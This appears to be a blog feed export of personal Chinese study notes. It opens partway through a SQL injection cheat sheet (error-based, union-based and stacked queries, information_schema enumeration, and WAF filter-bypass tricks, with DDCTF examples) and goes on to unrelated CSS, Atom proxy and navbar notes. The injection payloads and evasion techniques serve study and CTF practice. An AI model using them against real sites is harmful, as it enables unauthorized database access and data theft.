<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> book <span class="token keyword">where</span> type_id <span class="token operator">=</span> <span class="token number">14</span> <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>区别在于<code>extractvalue</code>的调用方法是<code>extractvalue(arg1, arg2)</code>,其中<code>xpath</code>在<code>arg2</code>的位置上<br>而<code>updatexml</code>是<code>updatexml(arg1, arg2, arg3)</code>,其中<code>xpath</code>在<code>arg2</code>的位置上</p>
</li>
<li><p>floor()<br>感觉这个floor还是比前面两个复杂，先上一段payload,算了还是先上几个学习资源吧<br><a href="http://www.cnblogs.com/xishaonian/p/6227405.html" target="_blank" rel="external">http://www.cnblogs.com/xishaonian/p/6227405.html</a><br><a href="https://www.zhihu.com/question/21031129" target="_blank" rel="external">https://www.zhihu.com/question/21031129</a><br>报错需要具备<code>count(*),rand(),group by</code></p>
</li>
</ul>
<h3 id="基于union的注入"><a href="#基于union的注入" class="headerlink" title="基于union的注入"></a>基于union的注入</h3><p>这个就比较常见啦</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3 <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">null</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>只不过有的时候会有限制显示结果只显示一行,这个时候要控制原来查询不返回结果,比如使用<code>id = -10086 union xxx</code><br>需要注意的地方是，类型要匹配，字段数量要匹配<br>字段类型匹配的问题，可以使用各种相容的<code>null</code>来实现<br>字段数量的话，可以用<code>order by field-n</code></p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3 <span class="token keyword">from</span> xxx <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> n
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个n是按照第n个字段排序，大于查询字段数量的时候会报错</p>
<h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>就是拿分号隔开，写多个sql语句，但默认的话<br>php+mysql不支持堆叠查询<br>具体支持情况看下面这个链接阔以<br><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries" target="_blank" rel="external">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#StackingQueries</a><br>据说好像是php用pdo方式的话好像阔以支持堆叠查询<br>不过很少用过</p>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><p>这样子是一下子爆一个,通过控制<code>limit n, 1</code>里面的<code>n</code>来显示第几条</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下面这个的话,用了<code>group_concat</code>，就可以一下子都搞出来</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'your_table_name'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更换这个<code>table_name=&#39;your_table_name&#39;</code>就可以了,要是过滤掉单引号，可以使用十六进制<code>table_name=0x???</code></p>
<h2 id="bypass-WAF"><a href="#bypass-WAF" class="headerlink" title="bypass WAF"></a>bypass WAF</h2><p>挖坑，然后填，一点一点积累</p>
<h3 id="条件注释"><a href="#条件注释" class="headerlink" title="条件注释"></a>条件注释</h3><p>这个条件注释好像只有mysql可用<br><code>/!.../</code>类型注释有两种的<code>/!select/</code>和<code>/!50000select/</code><br>加了版本号的是高于这个版本执行</p>
<h3 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a>select from</h3><p>过滤点常常在于<br>过滤掉了<code>select from</code>这样子的组合,<code>union select</code>也是一样的<br>例如</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> field<span class="token punctuation">,</span>1e0from <span class="token keyword">tables</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> field <span class="token comment" spellcheck="true">/*!50000from*/</span> <span class="token keyword">tables</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其实就是让select from看起来是一个selectxxxfrom</p>
<h3 id="代替空格"><a href="#代替空格" class="headerlink" title="代替空格"></a>代替空格</h3><h4 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h4><p><code>%09</code>,<code>%0a</code>,<code>%0b</code>,<code>%0c</code>,<code>%0d</code>,<code>%a0</code></p>
<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p><code>/**/</code>,<code>/*!*/</code>,<code>/*!50000*/</code></p>
<h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><p><code>1.0</code>,<code>1e0</code></p>
<h4 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h4><p><code>id=\Nunion</code> 这个<code>\N</code>是<code>NULL</code><br>所以自然也可以放到select这里咯</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span>\Nfrom<span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>就是对数字进行运算的<code>+</code>,<code>-</code>,<code>~</code>,<code>!</code><br>因为不能使用<code>select1e0from</code>这样子的，虽然<code>1e0from</code>这里没有问题<br>但<code>select1e0</code>这里还是过不去,所以要运算符隔开</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span><span class="token operator">~</span>1e0from<span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id=""><a href="#" class="headerlink" title="@"></a>@</h4><p>这个原理也不太懂好像是mysq的变量<br>只用@的话,后面没办法去掉空格</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span><span class="token variable">@aa</span> <span class="token keyword">from</span> book<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所以配合<code>\</code>``</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span><span class="token variable">@`type_id`</span><span class="token keyword">from</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但发现,这里的<code>type_id</code>即使是存在的字段，这里也是只会查到<code>NULL</code>,<br>那这种加上@`` 的使用其实是没啥用??直接用@bypass掉前面的空格不就行了<br>好像是还有一种</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span>@<span class="token operator">^</span>1e0from<span class="token punctuation">(</span>book<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里是由于可以引入数字所以可以bypass掉后面的空格而不报错,当然也可以<code>@^1</code>,但不能搞掉后面的空格<br>卧槽，我大概疯了，这样子没法用啊，我这后面的内容都只是说这样子写不报错，但有的不能注</p>
<blockquote>
<p>下面三个都只能用来括住字段名,表名</p>
</blockquote>
<h4 id="括号"><a href="#括号" class="headerlink" title="括号 ()"></a>括号 ()</h4><p>这个圆括号好像只能扩住字段</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span>book<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="括号-1"><a href="#括号-1" class="headerlink" title="括号 {}"></a>括号 {}</h4><p>这个没懂是什么鬼,这里的a换成<code>a-z</code>好像都可以<br>但好像只能用在字段名这里</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span>{<span class="token number">a</span> book}<span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="-1"><a href="#-1" class="headerlink" title="``"></a>``</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">`</span>book<span class="token punctuation">`</span><span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>所以他们可以使用的三个点<br><code>{a someting}</code>来举例</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span>{x id}<span class="token keyword">from</span>{x book}<span class="token keyword">where</span>{x id}<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="半个中文字符bypass注释"><a href="#半个中文字符bypass注释" class="headerlink" title="半个中文字符bypass注释"></a>半个中文字符bypass注释</h3><p><code>/**/</code>被过滤掉的时候<code>/*e4*/</code>这样子中文字符开始的</p>
<h3 id="函数执行"><a href="#函数执行" class="headerlink" title="函数执行"></a>函数执行</h3><p><code>\</code>version`()`这样子也可以用</p>
<h3 id="过滤掉单引号"><a href="#过滤掉单引号" class="headerlink" title="过滤掉单引号"></a>过滤掉单引号</h3><p>用十六进制来bypass</p>
<h3 id="逗号没了"><a href="#逗号没了" class="headerlink" title="逗号没了"></a>逗号没了</h3><ul>
<li>limit <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">1</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>mid/substr <pre class="line-numbers language-sql"><code class="language-sql"><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>union<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">a</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">b</span> jon <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">c</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
这个union处逗号过滤好像是上次DDCTF里用到了这个</li>
</ul>
<h3 id="这个不知道怎么叫"><a href="#这个不知道怎么叫" class="headerlink" title="这个不知道怎么叫"></a>这个不知道怎么叫</h3><p>很多地方都有类似的思想<br>比如<code>select</code>被替换为空,这个时候就可以<code>SELselectECT</code><br><code>*</code>被替换为空,这个时候不能<code>/**/</code>,不能<code>select *</code>是比较惨,但可以<code>un*ion select</code><br>(也不一定绝对可以,看具体逻辑)</p>
<h3 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h3><p>好像只是见于IIS,因为IIS解析unicode的缘故????<br>这里有个<a href="https://www.secpulse.com/archives/36810.html" target="_blank" rel="external">例子</a></p>
<h3 id="连等"><a href="#连等" class="headerlink" title="连等"></a>连等</h3><p>以前有个连等的例子忘记了，是啥<br><code>where xxx=&#39;1&#39;=&#39;0&#39;</code><br>等想起来补充吧</p>
<h3 id="过滤了字段名"><a href="#过滤了字段名" class="headerlink" title="过滤了字段名"></a>过滤了字段名</h3><p>DDCTF里遇到过滤了news表里的关键字段</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> i<span class="token number">.4</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news<span class="token punctuation">)</span>i
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>通过一个由join构建的临时表来union我们的news表，得到一个新的临时表i,这样子就能通过临时表i的字段来select出我们要的news表的数据<br>这里得到的新的表的字段就是<code>1</code>,<code>2</code>,<code>3</code>,<code>4</code></p>
<p>由于这个题目还过滤了逗号，所以实际上题目这一部分，还要过逗号，用上面的方法就是</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> i<span class="token number">.4</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token number">e</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token number">f</span> <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>g <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">4</span><span class="token punctuation">)</span>h <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> news<span class="token punctuation">)</span>i
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就是通过<code>select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d</code>来替换<code>select 1,2,3,4</code></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.secpulse.com/archives/4213.html" target="_blank" rel="external">https://www.secpulse.com/archives/4213.html</a> (sqlmap使用说明)<br><a href="http://www.cnblogs.com/REscan/p/7043705.html" target="_blank" rel="external">http://www.cnblogs.com/REscan/p/7043705.html</a> (偶然看到的，还没看)<br><a href="http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="external">http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a> (还没看)<br><a href="https://www.secpulse.com/archives/50067.html" target="_blank" rel="external">https://www.secpulse.com/archives/50067.html</a><br><a href="http://rainism-ashes.lofter.com/post/1d19feeb_887d7b6" target="_blank" rel="external">http://rainism-ashes.lofter.com/post/1d19feeb_887d7b6</a> (这个大佬blog疑似大量干货)</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[css从入门到入门2]]></title>
      <url>/2017/07/14/css%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E9%97%A82/</url>
      <content type="html"><![CDATA[<h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><p>这个在该元素设置了<code>width</code>或者<code>max-width</code>的前提下<br>之后再设置<code>margin:0 auto</code><br>可以实现水平居中的布局</p>
<p>不要和<code>float</code>混在一起,float之后应该是不能这样子居中的吧<br>因为<code>float</code>之后脱离文档流了咩</p>
<h4 id="和-text-align-center-相比"><a href="#和-text-align-center-相比" class="headerlink" title="和 text-align:center 相比"></a>和 text-align:center 相比</h4><p>这样子的话，对于一些内联元素(没办法设置<code>margin</code>)的可以采用<br>给内联元素的父元素设置<code>text-align:center</code>的方式</p>
<p>比如<code>img</code>的居中，或者把他转换成<code>block</code>，然后使用<code>margin: 0 auto</code><br>或者给<code>img</code>的父元素设置<code>text-align:center</code></p>
<h3 id="两栏布局"><a href="#两栏布局" class="headerlink" title="两栏布局"></a>两栏布局</h3><pre class="line-numbers language-html"><code class="language-html">|------------|----|
|---main-----|side|
|------------|----|
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>就是这样子的，整个由一个container构成，包裹着<code>main</code>和<code>side</code>,而<code>main</code>的话是设置<code>margin-right</code>为略大于<code>side</code>的<code>width</code>来控制自己不跑到<code>side</code>那边去<br>看到有些人是这样子做的，那为什么不直接给<code>main</code>一个<code>width</code>呢</p>
<h2 id="position"><a href="#position" class="headerlink" title="position"></a>position</h2><h3 id="absolute"><a href="#absolute" class="headerlink" title="absolute"></a>absolute</h3><p><code>position:absolute</code>会让元素<code>inline-block</code>化,然后是常常相对于一个不偏移的<code>position:relative</code>的父元素来偏移，这样子的话，可以很容易做一个透明层上去，或者各种浮层，比如鼠标移动上去就会显示的那种浮层，其实一直想知道<code>position:absolute</code>这种很危险的属性到底是为了实现什么效果的时候才不得不用???是这种浮层效果嘛<br>或者是一些框框上面的的关闭按钮之类的，额，也其实还是浮动层，那么问题来了，还有其他很常见的应用场景吗</p>
<h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><h3 id="backgroud-position"><a href="#backgroud-position" class="headerlink" title="backgroud-position"></a>backgroud-position</h3><p>传说中的切图，就是一张图上有好多东西，不需要把这样子一张大图切成小图，把图片设置成元素的背景，这个时候只需要控制图片在显示的部分，因为图比较大，所以只是露出来一部分，记得设置元素的宽和高正好等于你需要的显示出来的图片的大小，这这样子才能正好的遮盖<br>具体参考<a href="http://www.cnblogs.com/zgqys1980/p/4308434.html" target="_blank" rel="external">这里</a></p>
<h2 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h2><p>为什么字体图标经常用<span>标签</span></p>
]]></content>
      
        
        <tags>
            
            <tag> css </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[atom安装包]]></title>
      <url>/2017/07/13/atom%E5%AE%89%E8%A3%85%E5%8C%85/</url>
      <content type="html"><![CDATA[<p>编辑<code>~/.atom/.apmrc</code></p>
<p>添加</p>
<pre class="line-numbers language-bash"><code class="language-bash">strict-ssl<span class="token operator">=</span>false
https-proxy<span class="token operator">=</span>http://127.0.0.1:1080/
http-proxy<span class="token operator">=</span>http://127.0.0.1:1080/
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>网上还有说设置</p>
<pre class="line-numbers language-bash"><code class="language-bash">registry<span class="token operator">=</span>https://registry.npm.taobao.org/
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其实只是这样子是不行的，因为atom安装包还要访问atom官网，而不只是npm的问题</p>
]]></content>
      
        
        <tags>
            
            <tag> atom </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[导航栏制作]]></title>
      <url>/2017/07/13/%E5%AF%BC%E8%88%AA%E6%A0%8F%E5%88%B6%E4%BD%9C/</url>
      <content type="html"><![CDATA[<p>原先制作导航栏只是pc端，直接用的是<code>fixed</code>,但好像现在才发现，要适应手机的话，会有bug，在网上果然，以及有这个问题解决方法了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://efe.baidu.com/blog/mobile-fixed-layout/" target="_blank" rel="external">http://efe.baidu.com/blog/mobile-fixed-layout/</a><br><a href="http://www.w3cplus.com/css/sticky-headers.html" target="_blank" rel="external">http://www.w3cplus.com/css/sticky-headers.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[css从入门到放弃]]></title>
      <url>/2017/07/13/css%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
      <content type="html"><![CDATA[<h2 id="替换元素-非替代元素"><a href="#替换元素-非替代元素" class="headerlink" title="替换元素 非替代元素"></a>替换元素 非替代元素</h2><h3 id="替换元素"><a href="#替换元素" class="headerlink" title="替换元素"></a>替换元素</h3><p>浏览器根据元素的标签和属性来决定具体显示的内容<br>而这些元素本身没有什么内容，比如，<br>img、input、textarea、select、object都是替换元素</p>
<h3 id="非替换元素"><a href="#非替换元素" class="headerlink" title="非替换元素"></a>非替换元素</h3><h2 id="块级元素-行内元素"><a href="#块级元素-行内元素" class="headerlink" title="块级元素 行内元素"></a>块级元素 行内元素</h2><p>元素宽度在不设置的情况下，是它本身父容器的100%<br>块级元素独占一行<br>块级元素的<code>height</code>,<code>width</code>,<code>padding</code>,<code>border</code>和<code>margin</code>都可以设置的</p>
<ol>
<li>好像只要设置了浮动的元素自动转换成了块级</li>
<li>设置了<code>position:absolute</code>，与<code>position:fixed</code>也会转换成块级</li>
<li>直接用<code>display:block</code></li>
</ol>
<h3 id="典型的块级元素"><a href="#典型的块级元素" class="headerlink" title="典型的块级元素"></a>典型的块级元素</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>到<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="典型的行内元素"><a href="#典型的行内元素" class="headerlink" title="典型的行内元素"></a>典型的行内元素</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>、<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span> (非替换)
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span><span class="token punctuation">></span></span> (替换)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>本来以为行内元素都不能设置长宽，后来无意看到<a href="http://www.jianshu.com/p/274614a078f3" target="_blank" rel="external">这个</a>,下面摘自这个文章</p>
<blockquote>
<p>行内元素也就分为行内替换元素img input,与行内非替换元素span a…对于二者css修饰起来是有差别的。</p>
</blockquote>
<ul>
<li>行内非替换元素：其宽高设置无效， 对于内外边距，边框，可以设置，但是垂直方向的设置并不会影响文档流布局，所以设置垂直内外边距是没有效果的，垂直边框，我们是看得见，但是垂直边框并不占据文档流 。所以上面的行内元素设置了宽度为10px的边框，并不会导致下面元素的向下移动。</li>
<li>行内替换元素，除了具备行内元素同行并列的特点，他可以设置影响文档流布局的内外边距以及宽高。 且设置高度等同于设置行高，会垂直居中</li>
<li>line-height 行内非替换元素虽然不具备宽高，但是可以利用line-height来设置高度，但是奇葩的是，虽然行高可以影响行内元素的文档流布局，但是，其边框依旧会包裹其内容，忽略行高带来的上下留白。</li>
<li>margin 行内元素的边距，不会合并（替换非替换）。不同于块级元素，会合并上下，左右边距。</li>
</ul>
<p>怎么个差别呢(这，，不是很明显嘛)</p>
<h2 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h2><h3 id="为什么要使用浮动"><a href="#为什么要使用浮动" class="headerlink" title="为什么要使用浮动"></a>为什么要使用浮动</h3><p>我理解的通常意义上我们使用<code>float</code>就是，让一行显示多个div这样子的<code>块级元素</code><br>为了显示那种方块列表的效果</p>
<blockquote>
<p>All elements have a default display and most of the time that default is exactly what you want. In fact when you choose to use a div, it’s mainly because of it’s default display value of block.</p>
</blockquote>
<p>那为什么我们不使用<code>行内元素</code>呢，而不使用<code>块状元素</code>来达到这个效果呢，因为<code>块状元素</code>有<code>height</code>,<code>width</code>,<code>padding</code>,<code>border</code>和<code>margin</code></p>
<blockquote>
<p>Block level elements are laid out according to the box model, where each block has a width and height, as well as vertical and horizontal padding, border, and margin. </p>
</blockquote>
<p>但是</p>
<blockquote>
<p>Blocks are displayed vertically one after the other, with the distance between them depending on the margins set.<br>就是说虽然能实现是一个个我们需要的块，但他会独占一行(display vertically)，所以不能实现我们一行几个块，一行几个块，比如实现5*2的一个商品展示区的效果</p>
</blockquote>
<p>而我们的<code>行内元素</code>，虽然可以实现，一个接一个，即不独占一行，大家可以挤一挤(display horizontally)，但，他不像<code>块级元素</code>,能设置<code>height</code>,<code>width</code>,<code>padding</code>,<code>border</code>和<code>margin</code></p>
<blockquote>
<p>Inline elements are displayed horizontally and don’t follow the box model. Horizontally their padding and margin is respected, but not so vertically. The heights of inline boxes are set according to the rules of line-height calculations. For the most part that will mean the height of the containing block.</p>
</blockquote>
<p>这个时候就是有一个<code>inline-block</code>,他就能<code>display horizontally</code>(就是横着排一排)，还能设置<code>宽高边距</code>之类的</p>
<p>我们说的是浮动啊，浮动<br>我们<code>float</code>的是<code>block</code>元素<br>这个浮动是脱离了文档流，所以飘在自己原来所处的位置(这里是说竖直方向)的正上方(z轴正上方的样子),<br>这样子的话，原来在自己下面(竖直方向)的元素会浮动上来，就是无视float了的元素(脱离了标准流)<br>所以这个时候其实自己可能盖住原来竖直方向在自己下面的元素或者盖住部分，毕竟自己是飘着的嘛<br>而水平方向可以通过float的值是<code>left</code>还是<code>right</code>，来飘到这一行的左边还是右边</p>
<p>这里注意，当浮动元素上面的元素是文档流里的元素时候，元素float之后不会改变自己的竖直位置<br>但当自己前面一个元素也是float时候，也会跟上去</p>
<pre><code>[block1]
[block2 float:left]
</code></pre><p>对，大概就是这个意思吧</p>
<pre><code>[block1 float:left] [block2 float:left]
</code></pre><h3 id="浮动的副作用"><a href="#浮动的副作用" class="headerlink" title="浮动的副作用"></a>浮动的副作用</h3><p>在网上看到了浮动的副作用</p>
<ol>
<li>背景不能显示<br>由于浮动产生，如果对父级设置了（CSS background背景）CSS背景颜色或CSS背景图片，而父级不能被撑开，所以导致CSS背景不能显示。</li>
<li>边框不能撑开<br>如果父级设置了CSS边框属性（css border），由于子级里使用了float属性，产生浮动，父级不能被撑开，导致边框不能随内容而被撑开。</li>
<li>margin padding设置值不能正确显示<br>由于浮动导致父级子级之间设置了css padding、css margin属性的值不能正确表达。特别是上下边的padding和margin不能正确显示。</li>
<li>有高度塌陷的问题，这个时候要清除浮动</li>
</ol>
<h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><p>为什么要清除浮动</p>
<ol>
